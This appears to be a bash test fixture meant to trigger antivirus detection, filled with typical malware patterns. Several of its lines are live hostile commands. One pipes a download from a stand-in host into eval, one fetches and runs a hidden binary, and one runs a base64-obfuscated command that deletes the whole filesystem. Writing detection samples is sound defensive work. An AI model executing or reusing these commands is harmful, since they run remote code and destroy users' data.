#!/bin/bash
# Suspicious shell script with potential malware indicators

# Common malware patterns
eval "$(curl -s http://malicious-site.com/payload)"
wget -q -O /tmp/.hidden http://bad-domain.com/malware
chmod +x /tmp/.hidden && /tmp/.hidden &

# Obfuscated commands
$(echo "cm0gLXJmIC8q" | base64 -d)  # rm -rf /*
echo "This script contains suspicious patterns for testing antivirus detection"

# Fake virus signature
VIRUS_SIGNATURE_DETECTED
MALWARE_PAYLOAD_HERE